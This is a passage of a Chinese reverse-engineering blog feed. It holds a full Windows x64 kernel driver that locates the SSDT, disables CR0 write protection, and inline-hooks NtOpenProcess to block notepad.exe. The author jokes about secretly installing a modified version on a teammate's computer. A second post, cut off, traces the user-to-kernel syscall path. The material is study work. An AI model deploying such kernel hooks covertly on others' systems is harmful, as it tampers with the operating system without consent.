class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntddk.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-function">NTKERNELAPI UCHAR* <span class="hljs-title">PsGetProcessImageFileName</span><span class="hljs-params">(PEPROCESS EProcess)</span></span>;<br><span class="hljs-function">NTKERNELAPI UCHAR* <span class="hljs-title">PsLookupProcessByProcessId</span><span class="hljs-params">(IN ULONG ulProcId, OUT PEPROCESS* pEProcess)</span></span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>       DWORD;<br><span class="hljs-comment">//定义ssdt结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SERVICES_DESCRIPTOR_TABLE</span> &#123;</span>     <br>    PVOID ServiceTableBase;<span class="hljs-comment">// The Base of SSDT</span><br>    PVOID ServiceCounterTableBase;<br>    ULONGLONG ServiceCount;<span class="hljs-comment">// The Count of SSDT Function </span><br>    PVOID ParamTableBase;<br>&#125;SERVICES_DESCRIPTOR_TABLE, * PSERVICES_DESCRIPTOR_TABLE;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NTOPENPROCESS)</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    _Out_ PHANDLE ProcessHandle,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_opt_ PCLIENT_ID ClientId</span></span><br><span class="hljs-function"><span class="hljs-params">    )</span></span>;<br><br>NTOPENPROCESS originNtOpenProcess = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//用来保存openprocess地址</span><br>ULONG originAddress[<span class="hljs-number">1000</span>];<br><span class="hljs-comment">//UCHAR origincode[20];</span><br><span class="hljs-function">VOID <span class="hljs-title">wpOff</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//关闭</span><br><span class="hljs-function">VOID <span class="hljs-title">wpOn</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//写保护函数，主要是修改cr0寄存器，但是有一定风险比如核切换。。。所以测试时虚拟机分配单核</span><br><span class="hljs-function">UINT64 <span class="hljs-title">getKeServiceDescirptorTable</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//获取ssdt</span><br><span class="hljs-function">UINT64 <span class="hljs-title">getSsdtFunctionAddress</span><span class="hljs-params">(UINT32 index)</span></span>;<span class="hljs-comment">//获取函数地址</span><br><span class="hljs-function">VOID <span class="hljs-title">initinlinehook</span><span class="hljs-params">(UINT32 index)</span></span>;<span class="hljs-comment">//inline hook 跳板函数</span><br><span class="hljs-function">VOID <span class="hljs-title">ssdtHook</span><span class="hljs-params">(UINT32 index)</span></span>;<br><span class="hljs-function">UINT64 <span class="hljs-title">getFunctionCount</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//获取ssdt中函数偏移个数</span><br><span class="hljs-function">VOID <span class="hljs-title">ssdtUnhook</span><span class="hljs-params">(UINT32 index)</span></span>;<br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">myNtOpenProcess</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    _Out_ PHANDLE ProcessHandle,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_opt_ PCLIENT_ID ClientId)</span></span>;<br><br><br><span class="hljs-function">VOID <span class="hljs-title">Unload</span><span class="hljs-params">(IN PDRIVER_OBJECT pDriverObject)</span></span><br><span class="hljs-function"></span>&#123;<br>    ssdtUnhook(<span class="hljs-number">0x26</span>);<br>    DbgPrint(<span class="hljs-string">&quot;drive unload&quot;</span>);<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING  RegistryPath)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nCount = getFunctionCount();<br>    PSERVICES_DESCRIPTOR_TABLE p = (PSERVICES_DESCRIPTOR_TABLE)getKeServiceDescirptorTable();<br>    PULONG ssdt = (PULONG)p-&gt;ServiceTableBase;<br>    wpOff();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nCount; i++)<br>    &#123;<br>        originAddress[i] = ssdt[i];<br>    &#125;<br>    wpOn();<br>    DbgPrint(<span class="hljs-string">&quot;start_hook&quot;</span>);<br>    ssdtHook(<span class="hljs-number">0x69</span>);<br>    DbgPrint(<span class="hljs-string">&quot;done!!!&quot;</span>);<br>pDriverObject-&gt;DriverUnload = Unload;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br><br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">wpOff</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    __writecr0(__readcr0() &amp; (~(<span class="hljs-number">0x10000</span>)));<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    __asm<br>    &#123;<br>        push  eax<br>        mov    eax, CR0<br>        <span class="hljs-keyword">and</span> eax, <span class="hljs-keyword">not</span> <span class="hljs-number">0x10000</span><br>        mov    CR0, eax<br>        pop    eax<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">wpOn</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    __writecr0(__readcr0() | <span class="hljs-number">0x10000</span>);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    __asm<br>    &#123;<br>        push  eax<br>        mov    eax, CR0<br>        <span class="hljs-keyword">or</span> eax, <span class="hljs-number">0x10000</span><br>        mov    CR0, eax<br>        pop    eax<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">myNtOpenProcess</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    _Out_ PHANDLE ProcessHandle,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">    _In_opt_ PCLIENT_ID ClientId)</span></span><br><span class="hljs-function"></span>&#123;<br>    PEPROCESS process = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (STATUS_SUCCESS == PsLookupProcessByProcessId(ClientId-&gt;UniqueProcess, &amp;process))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(PsGetProcessImageFileName(process), <span class="hljs-string">&quot;notepad.exe&quot;</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> STATUS_PNP_INVALID_ID;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> originNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);<br>&#125;<br><span class="hljs-function">UINT64 <span class="hljs-title">getKeServiceDescirptorTable</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    UINT64 KeServiceDescirptorTable = <span class="hljs-number">0</span>;<br>    PUCHAR addrStartSearch = (PUCHAR)__readmsr((ULONG)(<span class="hljs-number">0xC0000082</span>)); <span class="hljs-comment">//KiSystemCall64Shadow or KiSystemCall64</span><br>    PUCHAR addrEndSearch = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (*(addrStartSearch + <span class="hljs-number">0x9</span>) == <span class="hljs-number">0x00</span>)<br>    &#123;<br>        addrEndSearch = addrStartSearch + <span class="hljs-number">0x500</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*(addrStartSearch + <span class="hljs-number">0x9</span>) == <span class="hljs-number">0x70</span>)<span class="hljs-comment">//这边可能不同版本有区别比如2004就是0x90,我虚拟机是0x70</span><br>    &#123;<br>        PUCHAR pKiSystemCall64Shadow = addrStartSearch;<br>        PUCHAR EndSearchAddress = pKiSystemCall64Shadow + <span class="hljs-number">0x500</span>;<br>        PUCHAR i = <span class="hljs-literal">NULL</span>;<br>        INT Temp = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (i = pKiSystemCall64Shadow; i &lt; EndSearchAddress; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (MmIsAddressValid(i) &amp;&amp; MmIsAddressValid(i + <span class="hljs-number">5</span>))<br>            &#123;<br>                <span class="hljs-keyword">if</span> (*i == <span class="hljs-number">0xe9</span> &amp;&amp; *(i + <span class="hljs-number">5</span>) == <span class="hljs-number">0xc3</span>)<br>                &#123;<br>                    <span class="hljs-built_in">memcpy</span>(&amp;Temp, i + <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>                    addrStartSearch = Temp + (i + <span class="hljs-number">5</span>); <br>                    addrEndSearch = addrStartSearch + <span class="hljs-number">0x500</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    ULONG tmpAddress = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (PUCHAR i = addrStartSearch; i &lt; addrEndSearch; i++, j++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (MmIsAddressValid(i) &amp;&amp; MmIsAddressValid(i + <span class="hljs-number">1</span>) &amp;&amp; MmIsAddressValid(i + <span class="hljs-number">2</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (addrStartSearch[j] == <span class="hljs-number">0x4c</span> &amp;&amp;<br>                addrStartSearch[j + <span class="hljs-number">1</span>] == <span class="hljs-number">0x8d</span> &amp;&amp;<br>                addrStartSearch[j + <span class="hljs-number">2</span>] == <span class="hljs-number">0x15</span>)<br>            &#123;<br>                RtlCopyMemory(&amp;tmpAddress, i + <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);  <br>                KeServiceDescirptorTable = tmpAddress + (INT64)i + <span class="hljs-number">7</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> KeServiceDescirptorTable;<br>&#125;<br><span class="hljs-function">UINT64 <span class="hljs-title">getSsdtFunctionAddress</span><span class="hljs-params">(UINT32 index)</span></span><br><span class="hljs-function"></span>&#123;<br>    INT64 address = <span class="hljs-number">0</span>;<br>    PSERVICES_DESCRIPTOR_TABLE pServiceDescriptorTable = (PSERVICES_DESCRIPTOR_TABLE)getKeServiceDescirptorTable();<br>    PULONG ssdt = (PULONG)pServiceDescriptorTable-&gt;ServiceTableBase;<br>    ULONG  dwOffset = ssdt[index];<br>    dwOffset &gt;&gt;= <span class="hljs-number">4</span>;           <br>    address = (UINT64)ssdt + dwOffset; <br>    <span class="hljs-comment">//DbgPrint(&quot;0x%llX\n&quot;, address);</span><br>    <span class="hljs-keyword">return</span> address;<br>&#125;<br><span class="hljs-function">VOID <span class="hljs-title">initinlinehook</span><span class="hljs-params">(UINT32 index)</span></span><br><span class="hljs-function"></span>&#123;<br>    UCHAR jmpCode[<span class="hljs-number">13</span>] = <span class="hljs-string">&quot;\x48\xB8\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\xFF\xE0&quot;</span>;<br>    UINT64 proxyFunction;<br>    UINT64 AAA = getSsdtFunctionAddress(index);<br>    proxyFunction = (UINT64)myNtOpenProcess;  <br>    RtlCopyMemory(jmpCode + <span class="hljs-number">2</span>, &amp;proxyFunction, <span class="hljs-number">8</span>);<br>    wpOff();  <br>    <span class="hljs-built_in">memset</span>(AAA, <span class="hljs-number">0x90</span>, <span class="hljs-number">15</span>);  <br>    RtlCopyMemory(AAA, jmpCode, <span class="hljs-number">12</span>); <br>    wpOn();    <br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-function">VOID <span class="hljs-title">ssdtHook</span><span class="hljs-params">(UINT32 index)</span></span><br><span class="hljs-function"></span>&#123;<br>    PSERVICES_DESCRIPTOR_TABLE pKeServiceDescriptorTable = (PSERVICES_DESCRIPTOR_TABLE)getKeServiceDescirptorTable();<br>    PULONG pSsdt = (PULONG)pKeServiceDescriptorTable-&gt;ServiceTableBase;<br>    originNtOpenProcess = (NTOPENPROCESS)getSsdtFunctionAddress(<span class="hljs-number">0x26</span>);<br>    initinlinehook(index);<br>    wpOff();<br>    pSsdt[<span class="hljs-number">0x26</span>] = pSsdt[index];  <span class="hljs-comment">// SSDT HOOK</span><br>    wpOn();<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-function">UINT64 <span class="hljs-title">getFunctionCount</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    PSERVICES_DESCRIPTOR_TABLE pKeServiceDescriptorTable;<br>    pKeServiceDescriptorTable = (PSERVICES_DESCRIPTOR_TABLE)getKeServiceDescirptorTable();<br>    <span class="hljs-keyword">return</span> (UINT64)(pKeServiceDescriptorTable-&gt;ServiceCount);<br><br>&#125;<br><span class="hljs-function">VOID <span class="hljs-title">ssdtUnhook</span><span class="hljs-params">(UINT32 index)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nCount = getFunctionCount();<br>    PSERVICES_DESCRIPTOR_TABLE p = (PSERVICES_DESCRIPTOR_TABLE)getKeServiceDescirptorTable();<br>    PULONG ssdt = (PULONG)p-&gt;ServiceTableBase;<br>    wpOff();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nCount; i++)<br>    &#123;<br>        ssdt[i] = originAddress[i];<br>    &#125;<br>    wpOn();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>因为在x64中ssdt和ssdtshadow都没有导出，所以得通过特征码搜寻找到地址</p><p><img src="image-20200715162628766.png" alt="image-20200715162628766"></p><p>这边取4c 8d 15就能获取系统服务表地址</p><p>这边有个坑就是__readmsr((ULONG)(0xC0000082)); //KiSystemCall64Shadow or KiSystemCall64</p><p>教材上是KiSystemCall64。然后往后0x500字节左右可以找到系统服务表地址，但是我再win10上测试发现readmsr地址是KiSystemCall64Shadow，这就需要再次匹配特侦码，具体看ntoskrnl.exe，一开始还看错了。。。我看的我物理机的ntoskrnl.exe，而虚拟机的和物理机有点差异。。。具体看代码了</p><p>获取到系统服务表地址后就需要得到需要ssdt hook的函数地址，这边hook的是ntopenprocess，系统调用号是0x26，关于调用号得看ntdll.dll，因为ntopenprocess后来被hook后直接调用操作系统会根据系统服务表去call ntopenprocess，然后系统服务表处已经被hook所以虚拟机会卡死，出现死循环。。。</p><p>保存好地址后初始化shellcode，因为x64得改变系统服务表中存放的不是地址而是偏移，这也导致了无法直接跳转到我们写的函数，必须寻找一个跳板函数来进行inline hook，像教材中采用的是蓝屏函数KeBugCheckEx，但是我的win10中这个函数已经不在ssdt表中，就换了个ZwAddBootEntry，问了别的大佬听说也能用NtCreatePort</p><p>inline hook完事后只需要把inline hook函数对应调用号处得偏移给我们ssdt hook处即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">wpOff();<br>pSsdt[<span class="hljs-number">0x26</span>] = pSsdt[index];  <span class="hljs-comment">// SSDT HOOK</span><br>wpOn();<br></code></pre></td></tr></table></figure><p>并没有绕pg，但是钩子挂个一段时间不会蓝屏，运气好几小时，运气差点半小时就被检测了，所以unhook流程也没有把inline hook处给还原，就是单纯恢复系统服务表，可以看到在DriverEntry处首先做的就是备份，用来在unhook时还原。</p><p>主要hook功能是检测是否打开记事本，如果是则阻止，这边可以稍作修改比如设置一波自启动啊然后检测是否打开什么类似炉石传说，然后趁队友离开电脑时偷偷给他挂上什么的。。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API从3到0的学习</title>
    <link href="/2020/08/11/API%E4%BB%8E3%E5%88%B00%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/08/11/API%E4%BB%8E3%E5%88%B00%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>主要是记录下逆向过程</p><p>api从三环到零环的调用</p><a id="more"></a><h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>为了方便先以x86为例子来演示</p><p>函数为VirtualAllocEx</p><p><img src="image-20200709034307624.png" alt="image-20200709034307624"></p><p>可以看到调用了NtAllocateVirtualMemory来自ntdll.dll</p><p><img src="image-20200709034418063.png" alt="image-20200709034418063"></p><p>这边可以看到调用了7FFE0300h处所指向的的函数</p><p>这就涉及到一个结构体_KUSER_SHARED_DATA</p><p>User 层地址为：0x7ffe0000<br>Kernnel 层地址为：0xffdf0000</p><p>他们分别映射在同一个物理页，但是只有0环才有写权限 //pte属性rw位</p><p><img src="image-20200709041346718.png" alt="image-20200709041346718"></p><p><img src="image-20200709034813255.png" alt="image-20200709034813255"></p><p>windbg查看结构体，可见0x300偏移处是 +0x300 SystemCall，查看一波地址</p><p><img src="image-20200709042527814.png" alt="image-20200709042527814"></p><p>这边是sysenter快速调用，所需要替换的寄存器都放在msr寄存器中，当然除了ss，ss是通过cs+8计算得</p><p>当然如果cpu不支持的话也有中断门，esp0和ss0在tss任务段，但现在基本都使用快速调用了</p><p><img src="image-20200709042738747.png" alt="image-20200709042738747"></p><p>可以在ntdll中看到</p><p><img src="image-20200709042807821.png" alt="image-20200709042807821"></p><p>上面是中断门。</p><p>下面来分析一波进入0环后的操作</p><p>分析的内核文件是ntoskrnl，如果是29912分页就不是分析这个了，应该是ntkrnlpa，这边默认101012分页，文件在c盘system32下可找到</p><p><img src="image-20200710123545634.png" alt="image-20200710123545634"></p><p>中断门0x2e在idt表中查找到对应处理函数//KiSystemService</p><p>如果是快速调用的话是KiFastCallEntry</p><p><img src="image-20200710124401242.png" alt="image-20200710124401242"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">+<span class="hljs-number">0</span>x07c V86Es            : <span class="hljs-type">Uint4B</span><br>+<span class="hljs-number">0</span>x080 V86Ds            : <span class="hljs-type">Uint4B</span><br>+<span class="hljs-number">0</span>x084 V86Fs            : <span class="hljs-type">Uint4B</span><br>+<span class="hljs-number">0</span>x088 V86Gs            : <span class="hljs-type">Uint4B</span><br></code></pre></td></tr></table></figure><p>是在虚拟8086下使用</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">+<span class="hljs-number">0</span>x068 Eip              : <span class="hljs-type">Uint4B</span><br>+<span class="hljs-number">0</span>x06c SegCs            : <span class="hljs-type">Uint4B</span><br>+<span class="hljs-number">0</span>x070 EFlags           : <span class="hljs-type">Uint4B</span><br>+<span class="hljs-number">0</span>x074 HardwareEsp      : <span class="hljs-type">Uint4B</span><br>+<span class="hljs-number">0</span>x078 HardwareSegSs    : <span class="hljs-type">Uint4B</span><br></code></pre></td></tr></table></figure><p>这五个是中断发生时保存的</p><p>下面分析代码</p><p><img src="image-20200710124907345.png" alt="image-20200710124907345"></p><p>这边保存寄存器，其实就是往ktrapframe里面赋值，可以发现0就是errorcode</p><p>当权限切换至0环，因为已经压栈5个参数，所以esp指向的正好是trapframe的errorcode处</p><p>push完后修改fs寄存器，在gdt表中可查看fs对应了kpcr</p><p><img src="image-20200710125923729.png" alt="image-20200710125923729"></p><p><img src="image-20200710130006685.png" alt="image-20200710130006685"></p><p>然后是吧异常链表压栈，我们都知道在三环fs所对应的是teb，在0环就是kpcr了，所以所使用的异常链表不一样，压栈链表后第一个操作就是清空mov     dword ptr ds:0FFDFF000h, 0FFFFFFFFh</p><p>下面给esi赋值，esi指向了_KTHREAD</p><p><img src="image-20200710130228227.png" alt="image-20200710130228227"></p><p>可以看见kpcr 0x124偏移处是+0x004 CurrentThread    : Ptr32 _KTHREAD</p><p>接着吧cs取出最低位and 1赋值给esi+0x140</p><p>就是+0x140 PreviousMode     : Char</p><p>很简单，因为cs低俩位表示所处权限模式</p><p>接着把esi+0x134的TrapFrame给ebx，再把ebx赋值到esp+0x3c处然后吧当前TrapFrame保存给esi+0x134</p><p>然后是ebp和eip给调试所需要保存位置mov     [ebp+0Ch], edx保存参数</p><p><img src="image-20200710130942858.png" alt="image-20200710130942858"></p><p>最后一部分操作如上，esi+0x2c</p><p>查看一波就是检测调试状态</p><p><img src="image-20200710131013361.png" alt="image-20200710131013361"></p><p>如果处在调试状态就跳转</p><p><img src="image-20200710131046910.png" alt="image-20200710131046910"></p><p>可以看到就是在赋值调试所需要的寄存器</p><p>如果不在调试就直接跳转</p><p>//这边可以扩展假如你起个线程往里面不停写值，调试的时候就无法下硬件断点了，因为相关调试寄存器都没赋值。</p><p><img src="image-20200710131205514.png" alt="image-20200710131205514"></p><p>可以看到改地址所处函数为KiFastCallEntry，即是快速调用处</p><p><img src="image-20200710131324039.png" alt="image-20200710131324039"></p><p>这边就是当cpu支持快速调用时，所做的保存现场操作了</p><p><img src="image-20200711005227693.png" alt="image-20200711005227693"></p><p>稍微逆向一下，其实可以明显发现大部分与中断相同，就是中断前操作系统已经帮你push五个寄存器，而快速调用需要自己来</p><p>下面来看一波系统服务表，因为api进0环时之前说过是通过eax来找到所调用函数的，那怎么找就涉及到系统服务表了</p><p><img src="image-20200711011458861.png" alt="image-20200711011458861"></p><p>先来看看系统服务表，里面有俩张，分别是俩个内核模块得导出函数，系统服务表里面并没有所有内核函数，而是有所有提供给三环的内核函数，下面win32k得是和图形相关的内核函数</p><p><img src="image-20200711142344469.png" alt="image-20200711142344469"></p><p>在windbg重通过查找ssdt来找到系统服务表</p><p><img src="image-20200711011640903.png" alt="image-20200711011640903"></p><p>系统服务表位于kthread+0xe0处</p><p>至于如何判断使用哪个表得看eax，eax低12位位索引，第13位决定了用哪张表，参数个数则以字节为单位，占多少字节个数就是多少，比如俩个int那么个数就是8。</p><p>下面开始逆向</p><p><img src="image-20200711012337978.png" alt="image-20200711012337978"></p><p>eax&gt;&gt;8</p><p>and 0x30</p><p>如果第13位为0，那么所得答案就是0，否则为0x10，而这正好是系统服务表第一级大小</p><p>add     edi, [esi+0E0h]就正好可以决定使用哪张表，然后and eax 0xfff，取了低12位索引。</p><p>判断是否越界</p><p>然后是针对第二张表的一些操作这边忽略直接跳转</p><p><img src="image-20200711012826399.png" alt="image-20200711012826399"></p><p>mov     cl, [eax+ebx]此时ebx指向了参数个数edi指向了所用系统服务表开始</p><p>mov     ebx, [edi+eax*4]吧所需要调用函数地址给ebx</p><p>下面参数拷贝一次性拷贝4字节，从esi开始这边指向了参数，拷贝到edi就是esp位置，拷贝ecx&gt;&gt;2个4字节</p><p>然后call ebx，三环到0环api如何调用就基本逆完</p><h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>环境win10 x64</p><p>这边以VirtualAlloc为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span>* lpv = (<span class="hljs-keyword">char</span>*)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>, MEM_RESERVE,PAGE_READWRITE);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序反编译如下</p><p><img src="image-20200715124630512.png" alt="image-20200715124630512"></p><p>可以看到跳转到了kernel32</p><p><img src="image-20200715124723869.png" alt="image-20200715124723869"></p><p>紧接着kernel32跳转kernelbase.dll</p><p><img src="image-20200715124747529.png" alt="image-20200715124747529"></p><p>在kernelbase.dll中查询相关函数</p><p>可以发现调用了ntdll的函数</p><p><img src="image-20200715125002945.png" alt="image-20200715125002945"></p><p><img src="image-20200715125037338.png" alt="image-20200715125037338"></p><p>和x86很像，查看_KUSER_SHARED_DATA偏移308处</p><p><img src="image-20200715125239805.png" alt="image-20200715125239805"></p><p>系统调用，可以判断这边是在验证cpu是否支持快速调用，如不支持则跳转int 0x2e中断门</p><p>下面康康快速调用入口(64)看ntoskrnl.exe</p><p><img src="image-20200715145007223.png" alt="image-20200715145007223"></p><p>gs和fs一样，所以在零环这边gs就是kpcr</p><p>切换堆栈后开始往trapframe里push保存现场环境</p><p><img src="image-20200715145113267.png" alt="image-20200715145113267"></p><p>可以看到gs:10h处是用户空间esp</p><p><img src="image-20200715145139189.png" alt="image-20200715145139189"></p><p>替换rsp为rsp0，开始保存环境</p><p><img src="image-20200715145211820.png" alt="image-20200715145211820"></p><p>trapframe如上</p><p><img src="image-20200715150103631.png" alt="image-20200715150103631"></p><p>保存现场工作完成后开始更具系统调用号来找系统服务表</p><p><img src="image-20200715150905530.png" alt="image-20200715150905530"></p><p>x64和x86还是不一样，这边取表做了些运算</p><p><img src="image-20200715151051374.png" 